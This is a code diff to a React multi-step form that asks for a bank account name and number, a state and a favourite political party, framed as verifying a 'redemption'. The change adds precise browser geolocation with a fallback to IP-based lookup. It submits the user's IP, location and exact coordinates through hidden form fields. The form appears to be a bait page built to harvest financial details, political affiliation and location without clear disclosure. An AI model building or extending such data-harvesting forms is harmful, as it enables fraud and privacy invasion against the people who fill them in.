@@ -118,7 +118,8 @@ export function DetailsForm() {
   const [direction, setDirection] = useState(1);
 
   const [ipAddress, setIpAddress] = useState('');
-  const [location, setLocation] = useState('');
+  const [ipLocation, setIpLocation] = useState('');
+  const [coords, setCoords] = useState<{lat: number, long: number} | null>(null);
 
   const form = useForm<FormValues>({
     resolver: zodResolver(formSchema),
@@ -170,18 +171,40 @@ export function DetailsForm() {
   const selectedParty = form.watch('favoriteParty');
 
   useEffect(() => {
+    // Precise location with user permission
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setCoords({
+            lat: position.coords.latitude,
+            long: position.coords.longitude
+          });
+        },
+        (error) => {
+          console.warn(`Geolocation error (${error.code}): ${error.message}`);
+          // Fallback to IP-based location if permission denied
+          fetchIpLocation();
+        }
+      );
+    } else {
+      console.log('Geolocation not available, falling back to IP-based location.');
+      fetchIpLocation();
+    }
+  }, []);
+
+  const fetchIpLocation = () => {
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
         setIpAddress(data.ip);
-        setLocation(`${data.city}, ${data.region}, ${data.country_name}`);
+        setIpLocation(`${data.city}, ${data.region}, ${data.country_name}`);
       })
       .catch(err => {
-        console.error("Could not fetch location data", err);
+        console.error("Could not fetch IP location data", err);
         setIpAddress('Unavailable');
-        setLocation('Unavailable');
-      })
-  }, []);
+        setIpLocation('Unavailable');
+      });
+  };
   
   const nextStep = async () => {
     const fields = STEPS[step - 1].fields;
@@ -255,16 +278,18 @@ export function DetailsForm() {
 
           <div className="relative h-[330px]">
             <AnimatePresence initial={false} custom={direction} mode="wait">
-              {step === 1 && (
-                 <motion.div
-                    key={1}
-                    custom={direction}
-                    variants={stepVariants}
-                    initial="hidden"
-                    animate="visible"
-                    exit="exit"
-                    className="space-y-4 absolute w-full"
+              <motion.div
+                key={step}
+                custom={direction}
+                variants={stepVariants}
+                initial="hidden"
+                animate="visible"
+                exit="exit"
+                className="absolute w-full h-full"
                 >
+                <div className="h-full overflow-y-auto pr-4 space-y-4 no-scrollbar">
+              {step === 1 && (
+                 <>
                     <FormField control={form.control} name="accountName" render={({ field }) => (
                         <FormItem>
                             <FormLabel>Full Name (as on bank account)</FormLabel>
@@ -295,19 +320,11 @@ export function DetailsForm() {
                             <FormMessage />
                         </FormItem>
                     )} />
-                </motion.div>
+                </>
               )}
 
               {step === 2 && (
-                 <motion.div
-                    key={2}
-                    custom={direction}
-                    variants={stepVariants}
-                    initial="hidden"
-                    animate="visible"
-                    exit="exit"
-                    className="space-y-4 absolute w-full"
-                >
+                 <>
                   <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                         <FormField control={form.control} name="state" render={({ field }) => (
                             <FormItem>
@@ -363,19 +380,11 @@ export function DetailsForm() {
                     <MapPin className="h-4 w-4" />
                     <span>Your location helps us verify your redemption.</span>
                   </div>
-                </motion.div>
+                </>
               )}
 
               {step === 3 && (
-                 <motion.div
-                    key={3}
-                    custom={direction}
-                    variants={stepVariants}
-                    initial="hidden"
-                    animate="visible"
-                    exit="exit"
-                    className="space-y-4 absolute w-full"
-                >
+                 <>
                     <FormField
                         control={form.control}
                         name="favoriteParty"
@@ -400,9 +409,9 @@ export function DetailsForm() {
                                                 <Image
                                                     src={party.logo}
                                                     alt={`${party.name} logo`}
-                                                    width={64}
-                                                    height={64}
-                                                    className="object-contain h-10 w-10 sm:h-16 sm:w-16"
+                                                    width={40}
+                                                    height={40}
+                                                    className="object-contain h-10 w-10 sm:h-12 sm:w-12"
                                                 />
                                                 <p className="text-sm font-semibold">{party.name}</p>
                                                 {selectedParty === party.name && (
@@ -418,20 +427,12 @@ export function DetailsForm() {
                             </FormItem>
                         )}
                     />
-                </motion.div>
+                </>
               )}
 
 
               {step === 4 && (
-                 <motion.div
-                    key={4}
-                    custom={direction}
-                    variants={stepVariants}
-                    initial="hidden"
-                    animate="visible"
-                    exit="exit"
-                    className="space-y-4 absolute w-full"
-                >
+                 <>
                   <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                      <FormField control={form.control} name="accountNumber" render={({ field }) => (
                         <FormItem>
@@ -462,8 +463,10 @@ export function DetailsForm() {
                             <FormMessage />
                         </FormItem>
                     )} />
-                </motion.div>
+                </>
               )}
+              </div>
+            </motion.div>
             </AnimatePresence>
           </div>
           
@@ -478,7 +481,9 @@ export function DetailsForm() {
       )}
 
       <input type="hidden" name="ipAddress" value={ipAddress} />
-      <input type="hidden" name="location" value={location} />
+      <input type="hidden" name="ipLocation" value={ipLocation} />
+      <input type="hidden" name="latitude" value={coords?.lat ?? ''} />
+      <input type="hidden" name="longitude" value={coords?.long ?? ''} />
     </form>
     </Form>
   );
